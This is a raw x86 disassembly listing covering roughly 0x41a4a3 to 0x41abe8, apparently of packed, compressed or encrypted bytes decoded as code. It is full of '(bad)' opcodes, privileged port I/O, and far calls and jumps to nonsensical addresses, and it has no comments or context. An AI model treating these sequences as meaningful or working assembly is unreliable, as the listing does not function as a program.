  41a4a3:	add    eax,0x30ad8165
  41a4a8:	test   DWORD PTR [ecx-0x2d9244e5],0x8110d4bd
  41a4b2:	retf   
  41a4b3:	sbb    DWORD PTR [edx],esi
  41a4b5:	(bad)  
  41a4b6:	cmp    BYTE PTR [edx+0x5],ah
  41a4b9:	in     eax,dx
  41a4ba:	cdq    
  41a4bb:	cmp    edi,DWORD PTR [esi]
  41a4bd:	cmc    
  41a4be:	xchg   ecx,eax
  41a4bf:	pop    eax
  41a4c0:	adc    eax,0x2a77d346
  41a4c5:	and    eax,0xb5d3328b
  41a4ca:	mov    dh,0x7c
  41a4cc:	popa   
  41a4cd:	push   0x7d7c860a
  41a4d2:	sti    
  41a4d3:	loope  0x41a472
  41a4d5:	push   cs
  41a4d6:	cmp    ch,al
  41a4d8:	xor    edi,DWORD PTR [ecx-0x196982e6]
  41a4de:	div    ah
  41a4e0:	cli    
  41a4e1:	loopne 0x41a562
  41a4e3:	loop   0x41a537
  41a4e5:	test   eax,0x99e8e77a
  41a4ea:	stos   DWORD PTR es:[edi],eax
  41a4eb:	cmp    al,0x81
  41a4ed:	in     al,dx
  41a4ee:	fisttp DWORD PTR [ebx+esi*2+0x29]
  41a4f2:	push   esp
  41a4f3:	int3   
  41a4f4:	enter  0x5659,0xfd
  41a4f8:	into   
  41a4f9:	in     eax,0x41
  41a4fb:	mov    al,0xee
  41a4fd:	dec    ebp
  41a4fe:	fistp  DWORD PTR [edi-0x6a]
  41a501:	xchg   ebp,eax
  41a502:	cdq    
  41a503:	pop    eax
  41a504:	les    ebx,FWORD PTR [edi]
  41a506:	or     bl,BYTE PTR ds:0x9331f25c
  41a50c:	mov    al,ds:0x75fe72ee
  41a511:	push   es
  41a512:	add    DWORD PTR [ecx+ebp*2+0x7a],0xc4cac0b6
  41a51a:	mov    eax,0x8130386a
  41a51f:	in     al,dx
  41a520:	stos   BYTE PTR es:[edi],al
  41a521:	loopne 0x41a4ff
  41a523:	push   edx
  41a524:	(bad)  
  41a525:	pop    ecx
  41a526:	dec    edi
  41a527:	and    ch,BYTE PTR ds:0x4982d05b
  41a52d:	push   cs
  41a52e:	mov    dl,0x74
  41a530:	push   ss
  41a531:	mov    DWORD PTR [edx],edi
  41a533:	aad    0x6d
  41a535:	call   0x4034aaf2
  41a53a:	jne    0x41a50b
  41a53c:	sub    al,0xab
  41a53e:	dec    edx
  41a53f:	stos   DWORD PTR es:[edi],eax
  41a540:	xor    ah,0xc9
  41a543:	sar    DWORD PTR [ecx+0x7067d07d],1
  41a549:	adc    BYTE PTR [ecx],bh
  41a54b:	enter  0xa0ac,0x3b
  41a54f:	retf   
  41a550:	fcom   QWORD PTR [ebx+eax*2+0x2d]
  41a554:	test   al,0xad
  41a556:	rol    BYTE PTR [edi+0x397f1e46],cl
  41a55c:	dec    esp
  41a55d:	stc    
  41a55e:	mov    bl,0x3d
  41a560:	add    cl,bl
  41a562:	mov    esp,0x3ae41954
  41a567:	inc    esp
  41a568:	dec    edx
  41a569:	js     0x41a59d
  41a56b:	call   0xf2fc:0xf956ce27
  41a572:	mov    edx,DWORD PTR [ebx]
  41a574:	xchg   ebx,eax
  41a575:	push   ecx
  41a576:	(bad)  
  41a577:	shr    DWORD PTR [edi],cl
  41a579:	mov    esi,eax
  41a57b:	mov    DWORD PTR [esi],edx
  41a57d:	stc    
  41a57e:	sbb    BYTE PTR [ebx+edx*1-0x5e037e10],bl
  41a585:	sbb    ebx,esp
  41a587:	jmp    DWORD PTR [eax]
  41a589:	or     al,0xf6
  41a58b:	push   ecx
  41a58c:	mov    eax,0x87a0a407
  41a591:	inc    esi
  41a592:	ins    DWORD PTR es:[edi],dx
  41a593:	or     al,0x6f
  41a595:	fldenv [eax+0x2bcca2d]
  41a59b:	cmp    edx,DWORD PTR [eax+0x3adf2706]
  41a5a1:	inc    esi
  41a5a2:	push   edi
  41a5a3:	sahf   
  41a5a4:	(bad)  
  41a5a5:	bound  edx,QWORD PTR [eax]
  41a5a7:	push   0xa53f1019
  41a5ac:	inc    eax
  41a5ad:	rcr    DWORD PTR [edi],0x39
  41a5b0:	ret    0xab6c
  41a5b3:	ins    DWORD PTR es:[edi],dx
  41a5b4:	mov    ah,0x7f
  41a5b6:	jle    0x41a585
  41a5b8:	dec    edi
  41a5b9:	xor    DWORD PTR [edi+0x76],ebp
  41a5bc:	cmp    ebp,ebx
  41a5be:	js     0x41a586
  41a5c0:	mov    ebx,0xad637765
  41a5c5:	mov    BYTE PTR [ecx+0x11bff5ae],0x3e
  41a5cc:	sub    al,0x64
  41a5ce:	inc    esi
  41a5cf:	shr    DWORD PTR ds:0x73761d4a,0x4c
  41a5d6:	test   BYTE PTR [edx-0x7a6490ed],cl
  41a5dc:	sbb    eax,0x90409c9c
  41a5e1:	add    dl,BYTE PTR [ebx-0x1152c888]
  41a5e7:	cs pop eax
  41a5e9:	lea    esp,[eax-0x60]
  41a5ec:	jl     0x41a592
  41a5ee:	pop    esi
  41a5ef:	(bad)  [esi+0x688c5ab3]
  41a5f5:	mov    esi,0xa825cfca
  41a5fa:	ins    DWORD PTR es:[edi],dx
  41a5fb:	push   eax
  41a5fc:	add    al,0xc7
  41a5fe:	out    0xab,eax
  41a600:	bound  esp,QWORD PTR [esi+eax*4-0x41dca120]
  41a607:	out    0x5b,al
  41a609:	jmp    0x41a67f
  41a60b:	or     bl,al
  41a60d:	ins    DWORD PTR es:[edi],dx
  41a60e:	jns    0x41a63c
  41a610:	dec    eax
  41a611:	or     eax,0x76a53dfe
  41a616:	dec    esp
  41a617:	mov    ds:0xc00632b3,al
  41a61c:	adc    esi,DWORD PTR [esi]
  41a61e:	sub    BYTE PTR [ecx-0x145864fb],cl
  41a624:	add    dl,BYTE PTR [ebx+0x478962af]
  41a62a:	fdivr  st,st(4)
  41a62c:	sub    edi,ecx
  41a62e:	xchg   ebp,eax
  41a62f:	in     al,dx
  41a630:	nop
  41a631:	mov    BYTE PTR [edi+0x28a82db6],cl
  41a637:	retf   
  41a638:	or     ebx,edi
  41a63a:	sbb    edx,DWORD PTR [esi-0x5f]
  41a63d:	pop    esp
  41a63e:	adc    edx,ebx
  41a640:	neg    BYTE PTR [esi-0x56d62b2d]
  41a646:	cmp    eax,0x936cebd6
  41a64b:	dec    dh
  41a64d:	jle    0x41a641
  41a64f:	lea    ecx,[edx-0x5edec410]
  41a655:	dec    edx
  41a656:	mov    ds:0x2eec079,eax
  41a65b:	and    bl,ah
  41a65d:	mov    esi,edi
  41a65f:	(bad)  
  41a660:	nop
  41a661:	call   FWORD PTR [esi]
  41a663:	popf   
  41a664:	ja     0x41a6b1
  41a666:	mov    ch,BYTE PTR [esi+ebp*4]
  41a669:	das    
  41a66a:	sbb    BYTE PTR [edx],al
  41a66c:	fild   DWORD PTR [ebx+0x36]
  41a66f:	sbb    ah,BYTE PTR [ecx]
  41a671:	jns    0x41a617
  41a673:	inc    edx
  41a674:	test   eax,0x5c895a68
  41a679:	test   DWORD PTR ds:0x1a38976c,ecx
  41a67f:	jbe    0x41a676
  41a681:	scas   al,BYTE PTR es:[edi]
  41a682:	mov    ah,BYTE PTR [esi+0x4d]
  41a685:	mov    dl,0xe2
  41a687:	pop    ebp
  41a688:	mov    edx,0x55f61fb8
  41a68d:	scas   eax,DWORD PTR es:[edi]
  41a68e:	mov    ds:0x6429a8d4,eax
  41a693:	mov    cl,0xf9
  41a695:	dec    ebp
  41a696:	mov    al,0x7b
  41a698:	outs   dx,DWORD PTR ds:[esi]
  41a699:	pop    ds
  41a69a:	mul    bl
  41a69c:	jmp    0x51d73ddd
  41a6a1:	call   0xb0e:0xf291530a
  41a6a8:	xor    ah,dl
  41a6aa:	mov    bl,0xcd
  41a6ac:	fwait
  41a6ad:	les    esi,FWORD PTR [edi+0x1e]
  41a6b0:	inc    ebp
  41a6b1:	inc    esp
  41a6b2:	mov    al,0x85
  41a6b4:	inc    edi
  41a6b5:	mov    al,0x74
  41a6b7:	adc    ecx,esp
  41a6b9:	and    ecx,DWORD PTR [esi+0x5a]
  41a6bc:	inc    edx
  41a6bd:	out    dx,al
  41a6be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6bf:	xchg   ecx,eax
  41a6c0:	dec    esp
  41a6c1:	push   ss
  41a6c2:	outs   dx,BYTE PTR ds:[esi]
  41a6c3:	(bad)  
  41a6c4:	jmp    0x67663346
  41a6c9:	dec    eax
  41a6ca:	addr16 dec ebp
  41a6cc:	pop    edx
  41a6cd:	ret    0x31dc
  41a6d0:	shr    DWORD PTR ds:0x9f7bbfb6,0x44
  41a6d7:	imul   ecx,DWORD PTR [ebx-0x40],0xdca24242
  41a6de:	lahf   
  41a6df:	push   ds
  41a6e0:	mov    eax,DWORD PTR [ebp-0x4fce4ad7]
  41a6e6:	test   ah,0xb2
  41a6e9:	mov    edi,0x4c963d56
  41a6ee:	sub    esp,0x5821e4b8
  41a6f4:	std    
  41a6f5:	popf   
  41a6f6:	pop    eax
  41a6f7:	push   ebx
  41a6f8:	jns    0x41a696
  41a6fa:	aam    0xd
  41a6fc:	enter  0xef45,0xcf
  41a700:	jbe    0x41a73b
  41a702:	(bad)  
  41a703:	fsubr  QWORD PTR [edx+0x4d]
  41a706:	(bad)  
  41a707:	mov    dl,0x5d
  41a709:	hlt    
  41a70a:	jge    0x41a6aa
  41a70c:	arpl   WORD PTR [edx+0x7e463728],bp
  41a712:	push   ecx
  41a713:	test   al,0x22
  41a715:	fs jno 0x41a6d0
  41a718:	(bad)  [edx+0x793a1bd2]
  41a71e:	pop    esp
  41a71f:	xchg   al,cl
  41a721:	std    
  41a722:	xor    eax,0xcdb909f0
  41a727:	xor    esp,edx
  41a729:	push   ebp
  41a72a:	ficom  WORD PTR ds:0x1a532e1b
  41a730:	lock jl 0x41a7a1
  41a733:	call   0xfec6:0xadf356c9
  41a73a:	pusha  
  41a73b:	push   ds
  41a73c:	out    0x4d,al
  41a73e:	popf   
  41a73f:	test   al,0x83
  41a741:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a742:	mov    ebx,0x69d34722
  41a747:	push   edx
  41a748:	xor    BYTE PTR [ebx],dl
  41a74a:	dec    eax
  41a74b:	mov    ax,0x3fd4
  41a74f:	fdiv   DWORD PTR [edi]
  41a751:	mov    cs,WORD PTR [ecx-0x58917dbe]
  41a757:	jp     0x41a73a
  41a759:	xchg   ebp,eax
  41a75a:	fisub  WORD PTR [edx-0x3ae7157]
  41a760:	add    BYTE PTR [esi-0x6982c857],cl
  41a766:	data16 or dh,BYTE PTR [ebx+0x3]
  41a76a:	xchg   ecx,eax
  41a76b:	lea    edi,[esp+0x4e]
  41a76f:	(bad)  [eax+0x23b4cd9b]
  41a775:	mov    ?,WORD PTR [ebp+0x46a2f68c]
  41a77b:	gs push edx
  41a77d:	add    esi,DWORD PTR [eax+eiz*1]
  41a780:	(bad)  
  41a781:	aas    
  41a782:	adc    al,BYTE PTR [edi]
  41a784:	xor    al,0x65
  41a786:	lahf   
  41a787:	dec    esp
  41a788:	sahf   
  41a789:	sub    eax,0x50750cca
  41a78e:	jb     0x41a76e
  41a790:	mov    dl,0x31
  41a792:	(bad)  
  41a793:	outs   dx,BYTE PTR ds:[esi]
  41a794:	xlat   BYTE PTR ds:[ebx]
  41a795:	iret   
  41a796:	ja     0x41a71b
  41a798:	rcl    WORD PTR ds:0x70de1d52,0xbe
  41a7a0:	adc    BYTE PTR [ebp+0x7e],dh
  41a7a3:	ins    DWORD PTR es:[edi],dx
  41a7a4:	xor    BYTE PTR [edx+edx*2-0x52],dl
  41a7a8:	or     al,0x21
  41a7aa:	dec    edi
  41a7ab:	(bad)  [eax+0x3]
  41a7ae:	add    esp,ebp
  41a7b0:	(bad)  
  41a7b1:	pop    edx
  41a7b2:	xor    al,0x4b
  41a7b4:	pop    esi
  41a7b5:	jge    0x41a816
  41a7b7:	adc    eax,0x216de457
  41a7bc:	enter  0xf75,0x41
  41a7c0:	adc    dh,BYTE PTR [ecx]
  41a7c2:	jl     0x41a785
  41a7c4:	gs dec esp
  41a7c6:	pusha  
  41a7c7:	ficomp DWORD PTR [eax]
  41a7c9:	dec    ecx
  41a7ca:	pop    esi
  41a7cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7cc:	(bad)  [esi+esi*1-0x2e2cb3fe]
  41a7d3:	in     al,dx
  41a7d4:	fsubp  st(0),st
  41a7d6:	sub    eax,0x9251edf1
  41a7db:	(bad)  
  41a7dc:	or     eax,0x3d2f305c
  41a7e1:	int3   
  41a7e2:	test   al,0x29
  41a7e4:	sbb    dh,BYTE PTR [edi]
  41a7e6:	cli    
  41a7e7:	cmp    esp,DWORD PTR [esi]
  41a7e9:	into   
  41a7ea:	mov    ebx,0x40f7aa4e
  41a7ef:	add    DWORD PTR [esi],edi
  41a7f1:	cmp    BYTE PTR [esi-0x4d],al
  41a7f4:	das    
  41a7f5:	adc    al,0xbe
  41a7f7:	fs pusha 
  41a7f9:	xor    BYTE PTR [edx-0x6ac4b2ff],cl
  41a7ff:	push   esi
  41a800:	cwde   
  41a801:	push   edi
  41a802:	xchg   edi,eax
  41a803:	jmp    0x84b0be29
  41a808:	lds    eax,FWORD PTR [esi+ebp*4+0x3230abf7]
  41a80f:	pusha  
  41a810:	fmul   DWORD PTR [ebx-0x642740f4]
  41a816:	adc    eax,0x3773131d
  41a81b:	gs pop esp
  41a81d:	test   al,0xea
  41a81f:	rcl    al,cl
  41a821:	inc    edi
  41a822:	mov    bl,0x91
  41a824:	and    ch,BYTE PTR [edi+0x5cf25e24]
  41a82a:	pop    ecx
  41a82b:	mov    dl,BYTE PTR [ebx]
  41a82d:	test   al,0xcd
  41a82f:	mov    eax,ds:0x1cb51dc7
  41a834:	clc    
  41a835:	test   eax,0x75fba715
  41a83a:	retf   0x9c53
  41a83d:	jns    0x41a7f4
  41a83f:	repnz xchg ebp,eax
  41a841:	imul   eax,DWORD PTR [esi],0x187b11b3
  41a847:	or     eax,0x36fcf6e4
  41a84c:	aam    0xd
  41a84e:	enter  0x8ddc,0x47
  41a852:	xchg   DWORD PTR [eax-0x348d07c5],ebp
  41a858:	repnz leave 
  41a85a:	pop    eax
  41a85b:	ret    0x12a9
  41a85e:	push   ecx
  41a85f:	aad    0xfd
  41a861:	xor    al,0xa7
  41a863:	sbb    bh,BYTE PTR [ebp+0x63]
  41a866:	rcr    cl,0x98
  41a869:	cmp    BYTE PTR [edi-0x19],0x0
  41a86d:	sbb    BYTE PTR [ecx],al
  41a86f:	pop    esp
  41a870:	xlat   BYTE PTR ds:[ebx]
  41a871:	nop
  41a872:	jecxz  0x41a803
  41a874:	sub    eax,0x3e505632
  41a879:	add    al,ch
  41a87b:	rol    ebp,1
  41a87d:	xchg   edx,eax
  41a87e:	xor    BYTE PTR [edi],bl
  41a880:	addr16 popa 
  41a882:	mov    DWORD PTR ds:0x8cdc7356,esi
  41a888:	mov    dh,0xa9
  41a88a:	push   edx
  41a88b:	pop    ds
  41a88c:	in     eax,dx
  41a88d:	fld    QWORD PTR [esi]
  41a88f:	dec    ebx
  41a890:	bound  edx,QWORD PTR [edi]
  41a892:	popa   
  41a893:	in     al,0x29
  41a895:	inc    ecx
  41a896:	fcomp  DWORD PTR [ecx]
  41a898:	mov    esi,0xc4c5303f
  41a89d:	cmp    ebx,DWORD PTR [eax]
  41a89f:	push   ds
  41a8a0:	sub    ch,bl
  41a8a2:	and    ah,dh
  41a8a4:	scas   eax,DWORD PTR es:[edi]
  41a8a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8a6:	das    
  41a8a7:	pop    ecx
  41a8a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8a9:	jecxz  0x41a8ef
  41a8ab:	push   ds
  41a8ac:	mov    bh,0x51
  41a8ae:	xor    esp,DWORD PTR [ebp+0x42]
  41a8b1:	pop    eax
  41a8b2:	repz jb 0x41a906
  41a8b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8b6:	icebp  
  41a8b7:	jle    0x41a8b7
  41a8b9:	pop    ds
  41a8ba:	ja     0x41a852
  41a8bc:	mov    ?,WORD PTR [ecx]
  41a8be:	out    dx,al
  41a8bf:	(bad)  
  41a8c0:	rep outs dx,DWORD PTR ds:[esi]
  41a8c2:	lock mov ?,WORD PTR [esi+0x7a]
  41a8c6:	dec    esp
  41a8c7:	and    esi,DWORD PTR [ebp-0x34e58e51]
  41a8cd:	test   al,0x1a
  41a8cf:	pop    edi
  41a8d0:	pop    esp
  41a8d1:	mov    dh,0xf2
  41a8d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8d4:	scas   eax,DWORD PTR es:[edi]
  41a8d5:	mov    edi,edx
  41a8d7:	sar    DWORD PTR [edx-0x4b0d5869],cl
  41a8dd:	fsub   DWORD PTR [ecx]
  41a8df:	cmp    al,0x68
  41a8e1:	jmp    0x667c2ee2
  41a8e6:	outs   dx,BYTE PTR ds:[esi]
  41a8e7:	mov    WORD PTR [ecx],gs
  41a8e9:	out    dx,al
  41a8ea:	daa    
  41a8eb:	outs   dx,BYTE PTR fs:[esi]
  41a8ed:	daa    
  41a8ee:	sbb    al,0x39
  41a8f0:	cwde   
  41a8f1:	xchg   ebp,eax
  41a8f2:	repnz add al,0x1e
  41a8f5:	addr16 pop ss
  41a8f7:	arpl   WORD PTR [edi+0x33],bx
  41a8fa:	les    eax,FWORD PTR [ebx-0x3d]
  41a8fd:	cmp    ebp,ecx
  41a8ff:	dec    eax
  41a900:	inc    ebp
  41a901:	lock cld 
  41a903:	cs adc edx,esi
  41a906:	iret   
  41a907:	mov    esp,0xeac432c3
  41a90c:	pop    esp
  41a90d:	add    DWORD PTR [esi-0x2c],edi
  41a910:	jne    0x41a8af
  41a912:	rcr    DWORD PTR [edi+0x4b],1
  41a915:	inc    eax
  41a916:	push   edi
  41a917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a918:	jo     0x41a979
  41a91a:	push   es
  41a91b:	call   0xccb6:0xe96522fb
  41a922:	fsubr  DWORD PTR [ebx]
  41a924:	mov    DWORD PTR [edi-0x4a],eax
  41a927:	pusha  
  41a928:	aad    0x23
  41a92a:	fst    QWORD PTR [esi]
  41a92c:	cs push 0xa8779554
  41a932:	xor    al,0x7a
  41a934:	add    ecx,edi
  41a936:	push   esp
  41a937:	mov    ds:0xd4b247d3,eax
  41a93c:	and    BYTE PTR [esi],bl
  41a93e:	je     0x41a92c
  41a940:	inc    edi
  41a941:	in     eax,0x46
  41a943:	adc    DWORD PTR [ecx+0x0],esp
  41a946:	push   edx
  41a947:	mov    esi,0xc35479e
  41a94c:	test   DWORD PTR [edi-0x4],eax
  41a94f:	enter  0xb7cd,0xa7
  41a953:	nop
  41a954:	loopne 0x41a973
  41a956:	and    ecx,ebp
  41a958:	jp     0x41a92f
  41a95a:	lahf   
  41a95b:	retf   0x222f
  41a95e:	adc    eax,DWORD PTR [esi]
  41a960:	xchg   edx,eax
  41a961:	dec    ebx
  41a962:	xchg   ebx,eax
  41a963:	inc    esi
  41a964:	sub    ebp,DWORD PTR [eax-0x44]
  41a967:	repnz add bl,dl
  41a96a:	ja     0x41a93b
  41a96c:	xor    esp,esi
  41a96e:	in     eax,dx
  41a96f:	mov    dl,ah
  41a971:	pop    es
  41a972:	ins    BYTE PTR es:[edi],dx
  41a973:	call   0x339fd91e
  41a978:	stos   BYTE PTR es:[edi],al
  41a979:	push   0xd406eb1d
  41a97e:	and    BYTE PTR [edx-0x77220953],cl
  41a984:	mov    al,0xb9
  41a986:	pop    ss
  41a987:	lahf   
  41a988:	cdq    
  41a989:	shl    BYTE PTR [ebp+0x48],1
  41a98c:	cdq    
  41a98d:	xlat   BYTE PTR ds:[ebx]
  41a98e:	xchg   edx,eax
  41a98f:	mov    edi,0x8315d530
  41a994:	pop    es
  41a995:	xchg   esp,eax
  41a996:	sbb    bh,BYTE PTR [ebx+ecx*8+0x7b62b422]
  41a99d:	es mov edi,0xaeb10c8a
  41a9a3:	not    BYTE PTR [eax-0x14]
  41a9a6:	aaa    
  41a9a7:	in     eax,0x3e
  41a9a9:	and    eax,0x134abe58
  41a9ae:	inc    edx
  41a9af:	pop    esp
  41a9b0:	les    eax,FWORD PTR [esi]
  41a9b2:	int3   
  41a9b3:	lods   eax,DWORD PTR ds:[esi]
  41a9b4:	(bad)  
  41a9b5:	sub    bl,ah
  41a9b7:	push   esp
  41a9b8:	push   ebp
  41a9b9:	es sbb al,0x16
  41a9bc:	xor    bl,BYTE PTR [ebp+0x55effa33]
  41a9c2:	mov    al,0xaf
  41a9c4:	mov    edx,0x6807bdd
  41a9c9:	and    al,0x4e
  41a9cb:	xchg   ecx,eax
  41a9cc:	cdq    
  41a9cd:	adc    cl,BYTE PTR [ecx]
  41a9cf:	adc    ebp,edi
  41a9d1:	neg    BYTE PTR [esi+0x22e3cb0a]
  41a9d7:	(bad)  
  41a9d8:	push   esi
  41a9d9:	sub    BYTE PTR [edi+edi*8+0x45025dda],ah
  41a9e0:	mov    ebp,edi
  41a9e2:	pop    es
  41a9e3:	pop    ecx
  41a9e4:	stc    
  41a9e5:	test   BYTE PTR [ebx+0x25b7527],0xe0
  41a9ec:	inc    esi
  41a9ed:	ret    0x8655
  41a9f0:	(bad)  
  41a9f1:	loopne 0x41aa4f
  41a9f3:	jbe    0x41a9e0
  41a9f5:	xchg   edi,eax
  41a9f6:	sub    dh,BYTE PTR [esi]
  41a9f8:	lods   al,BYTE PTR ds:[esi]
  41a9f9:	enter  0x30fc,0x89
  41a9fd:	mov    bl,0x8d
  41a9ff:	dec    eax
  41aa00:	retf   
  41aa01:	imul   edi,DWORD PTR [ecx+0x4f0a3254],0xffffffb8
  41aa08:	pop    esi
  41aa09:	fwait
  41aa0a:	data16 cmc 
  41aa0c:	ins    BYTE PTR es:[edi],dx
  41aa0d:	sahf   
  41aa0e:	push   0x1611ea19
  41aa13:	mov    BYTE PTR [eax+0x6f0762e8],ch
  41aa19:	mov    DWORD PTR [ebp+0x35],0x1d09a1fe
  41aa20:	dec    esi
  41aa21:	sbb    edi,DWORD PTR [esi]
  41aa23:	sahf   
  41aa24:	retf   
  41aa25:	push   ebx
  41aa26:	add    DWORD PTR [eax-0x3cfcde4d],ebp
  41aa2c:	aad    0x3e
  41aa2e:	cmc    
  41aa2f:	sbb    BYTE PTR [edx],bl
  41aa31:	rcr    edi,1
  41aa33:	out    0xef,eax
  41aa35:	dec    edx
  41aa36:	push   ds
  41aa37:	and    ah,BYTE PTR [eax-0x6dc84f7e]
  41aa3d:	bound  ebx,QWORD PTR [eax]
  41aa3f:	int    0x72
  41aa41:	push   eax
  41aa42:	jo     0x41aab1
  41aa44:	mov    edx,0x75708423
  41aa49:	cdq    
  41aa4a:	cli    
  41aa4b:	fwait
  41aa4c:	scas   al,BYTE PTR es:[edi]
  41aa4d:	mov    edi,0x8e0fdc32
  41aa52:	pop    edx
  41aa53:	and    esp,ecx
  41aa55:	sub    al,0xf0
  41aa57:	fs (bad) 
  41aa5a:	lods   eax,DWORD PTR gs:[esi]
  41aa5c:	add    BYTE PTR [ebp-0x17a4f773],ch
  41aa62:	add    DWORD PTR [esi-0x70],eax
  41aa65:	xchg   cl,cl
  41aa67:	mov    bh,0x9a
  41aa69:	stos   BYTE PTR es:[edi],al
  41aa6a:	pop    edx
  41aa6b:	mov    ah,0x7c
  41aa6d:	and    al,0x69
  41aa6f:	ret    0xe88d
  41aa72:	pop    eax
  41aa73:	push   ss
  41aa74:	push   0xc95e960d
  41aa79:	sub    eax,0x5228ad7e
  41aa7e:	cmp    al,0x18
  41aa80:	pop    es
  41aa81:	sbb    al,0x23
  41aa83:	shl    ch,1
  41aa85:	daa    
  41aa86:	sbb    al,0xf6
  41aa88:	or     eax,0xd1b31c94
  41aa8d:	fdivr  DWORD PTR [ecx-0xf]
  41aa90:	xchg   edx,eax
  41aa91:	adc    BYTE PTR [eax-0x6c836a3a],bh
  41aa97:	and    eax,ebx
  41aa99:	loope  0x41aa66
  41aa9b:	fldcw  WORD PTR [ecx+0x9]
  41aa9e:	add    BYTE PTR [edx+0x6d],dh
  41aaa1:	mov    al,0xde
  41aaa3:	daa    
  41aaa4:	test   BYTE PTR [ecx+0x66],0xd6
  41aaa8:	push   esi
  41aaa9:	add    al,0x1a
  41aaab:	push   es
  41aaac:	dec    ecx
  41aaad:	dec    esp
  41aaae:	test   edx,ebp
  41aab0:	pop    esp
  41aab1:	pop    esi
  41aab2:	xchg   ebp,eax
  41aab3:	and    al,0xe6
  41aab5:	and    DWORD PTR [edi],ecx
  41aab7:	and    DWORD PTR [ebx-0x2cc8358],edi
  41aabd:	add    ch,BYTE PTR [edx+0x39]
  41aac0:	icebp  
  41aac1:	or     edx,DWORD PTR [edi+eiz*1+0x49634b41]
  41aac8:	mov    ecx,0xe290f686
  41aacd:	ret    
  41aace:	pop    ds
  41aacf:	fst    QWORD PTR [ecx-0x1b60c3df]
  41aad5:	and    cl,BYTE PTR ds:0x2c197afe
  41aadb:	jg     0x41aac1
  41aadd:	popf   
  41aade:	outs   dx,DWORD PTR ds:[esi]
  41aadf:	loope  0x41aa77
  41aae1:	and    eax,0xe2817a30
  41aae6:	ror    DWORD PTR [ebx+ecx*2+0x4d],cl
  41aaea:	fwait
  41aaeb:	mov    ecx,0xfb772f13
  41aaf0:	call   0x5bfc:0x1733142f
  41aaf7:	into   
  41aaf8:	and    ah,al
  41aafa:	sbb    al,0x1a
  41aafc:	sbb    ebp,ebx
  41aafe:	pop    ss
  41aaff:	lock dec ebp
  41ab01:	sub    BYTE PTR [ebx-0x3c],cl
  41ab04:	and    eax,0xca03ac05
  41ab09:	test   al,0x6f
  41ab0b:	daa    
  41ab0c:	out    0x92,al
  41ab0e:	mov    bh,0x45
  41ab10:	stc    
  41ab11:	ret    
  41ab12:	mov    dh,0xc8
  41ab14:	outs   dx,BYTE PTR ds:[esi]
  41ab15:	cmp    cl,cl
  41ab17:	out    0x20,al
  41ab19:	(bad)  
  41ab1b:	ins    DWORD PTR es:[edi],dx
  41ab1c:	icebp  
  41ab1d:	popa   
  41ab1e:	pop    ebx
  41ab1f:	outs   dx,BYTE PTR ds:[esi]
  41ab20:	jge    0x41ab82
  41ab22:	imul   ebx,DWORD PTR [esi-0x58],0xf0af3437
  41ab29:	mov    dh,0xfa
  41ab2b:	and    esp,edi
  41ab2d:	push   edx
  41ab2e:	sbb    edi,esp
  41ab30:	sub    BYTE PTR [esi+ebx*1],al
  41ab33:	push   0xffffffe4
  41ab35:	imul   BYTE PTR [ebp-0x45]
  41ab38:	in     eax,dx
  41ab39:	call   0x18751277
  41ab3e:	(bad)  
  41ab3f:	fs inc esp
  41ab41:	push   cs
  41ab42:	lds    edi,FWORD PTR [ebp+0x73]
  41ab45:	add    eax,0xf4d5465
  41ab4a:	dec    ebp
  41ab4b:	inc    eax
  41ab4c:	push   ebp
  41ab4d:	test   al,0xdb
  41ab4f:	ins    BYTE PTR es:[edi],dx
  41ab50:	xor    bl,bh
  41ab52:	mov    ?,ebx
  41ab54:	mov    bl,0xb
  41ab56:	cmp    al,0xe6
  41ab58:	mov    dl,0xf7
  41ab5a:	in     eax,0x5f
  41ab5c:	ins    DWORD PTR es:[edi],dx
  41ab5d:	adc    eax,0x9fd52db3
  41ab62:	mov    bl,ah
  41ab64:	stos   DWORD PTR es:[edi],eax
  41ab65:	loope  0x41ab6c
  41ab67:	fdivr  DWORD PTR [ecx]
  41ab69:	gs aas 
  41ab6b:	and    al,0xb6
  41ab6d:	scas   al,BYTE PTR es:[edi]
  41ab6e:	mov    BYTE PTR [eax+0x66e869a9],cl
  41ab74:	stc    
  41ab75:	inc    esi
  41ab76:	mov    ebp,0x212196cb
  41ab7b:	dec    ebp
  41ab7c:	das    
  41ab7d:	sar    DWORD PTR [ebx],1
  41ab7f:	sub    eax,0x7155cb3e
  41ab84:	mov    ds:0x98ee5b40,eax
  41ab89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab8a:	sar    DWORD PTR [esi],0x69
  41ab8d:	cdq    
  41ab8e:	int    0x6d
  41ab90:	pop    eax
  41ab91:	and    cl,cl
  41ab93:	scas   eax,DWORD PTR es:[edi]
  41ab94:	jmp    0x548c8514
  41ab99:	sub    cl,ch
  41ab9b:	mov    esp,0x86853e0c
  41aba0:	sti    
  41aba1:	(bad)  
  41aba2:	fnstcw WORD PTR [ebx+0x2]
  41aba5:	in     al,0x90
  41aba7:	outs   dx,BYTE PTR ds:[esi]
  41aba8:	jns    0x7c843737
  41abae:	sbb    BYTE PTR [ebx+0x7],0xc6
  41abb2:	xlat   BYTE PTR ds:[ebx]
  41abb3:	bound  ebx,QWORD PTR [ecx+0x4c781985]
  41abb9:	pop    eax
  41abba:	inc    edi
  41abbb:	pusha  
  41abbc:	mov    ebx,fs
  41abbe:	hlt    
  41abbf:	jl     0x41abdc
  41abc1:	push   cs
  41abc2:	mov    eax,ds:0x1cab79b8
  41abc7:	pop    esi
  41abc8:	test   ebx,eax
  41abca:	aas    
  41abcb:	inc    edi
  41abcc:	mov    ah,0x18
  41abce:	mov    bh,0x62
  41abd0:	and    al,0x9a
  41abd2:	add    WORD PTR gs:[eax-0x7c],di
  41abd7:	out    0x59,al
  41abd9:	and    ebx,DWORD PTR [edi-0x21755114]
  41abdf:	inc    ecx
  41abe0:	push   eax
  41abe1:	mov    dl,BYTE PTR [esi+0x6f]
  41abe4:	outs   dx,BYTE PTR ds:[esi]
  41abe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abe6:	push   ebx
  41abe7:	(bad)  
  41abe8:	jmp    DWORD PTR ds:0x4da981c4
